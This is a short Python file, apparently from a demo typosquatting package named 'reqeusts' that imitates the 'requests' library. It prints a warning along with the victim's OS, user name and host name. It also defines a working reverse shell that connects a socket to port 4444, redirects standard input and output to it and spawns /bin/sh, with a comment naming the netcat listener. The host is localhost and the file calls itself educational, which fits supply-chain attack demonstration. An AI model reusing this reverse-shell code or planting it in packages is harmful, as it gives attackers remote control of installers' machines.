import platform
import getpass
import socket
import subprocess
import os
import pty

def warn():
    print("⚠️ WARNING: You may have installed a fake package (reqeusts instead of requests).")
    print("👉 This is a demo for educational purposes only.")
    print(f"🖥️ OS: {platform.system()} {platform.release()}")
    print(f"👤 User: {getpass.getuser()}")
    print(f"📡 Host: {socket.gethostname()}")


def reverse_shell():
    # attacker listener phải chạy: nc -lvp 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 4444))  # kết nối về localhost:4444

    # Chuyển stdin/stdout/stderr qua socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Spawn shell tương tác
    pty.spawn("/bin/sh")
